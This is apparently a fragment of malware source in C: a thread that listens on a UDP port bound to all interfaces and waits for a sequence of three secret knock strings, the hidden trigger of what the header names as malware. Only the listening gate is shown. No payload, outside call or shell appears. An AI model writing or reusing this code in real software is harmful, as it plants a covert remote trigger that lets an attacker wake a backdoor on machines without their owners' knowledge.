#include "malware.h"
#define BUFFER_SIZE 256

static void *port_knocking_thread(void *arg)
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        return 0;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(UDP_PORT),
        .sin_addr.s_addr = INADDR_ANY
    };
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }
    char buffer[BUFFER_SIZE];
    int index = 0;
    struct sockaddr_in sender;
    socklen_t sender_len = sizeof(sender);
    while (1) {
        int n = recvfrom(sock, buffer, sizeof(buffer) - 1, 0, 
                         (struct sockaddr *)&sender, &sender_len);
        if (n > 0) {
            buffer[n] = '\0';
            if ((index == 0 && strcmp(buffer, KNOCK1) == 0) ||
                (index == 1 && strcmp(buffer, KNOCK2) == 0) ||
                (index == 2 && strcmp(buffer, KNOCK3) == 0)) {
                index++;
            } else {
                index = 0;
            }
            if (index == 3) {
                break;
            }
        }
    }
    close(sock);
    return 0;
}
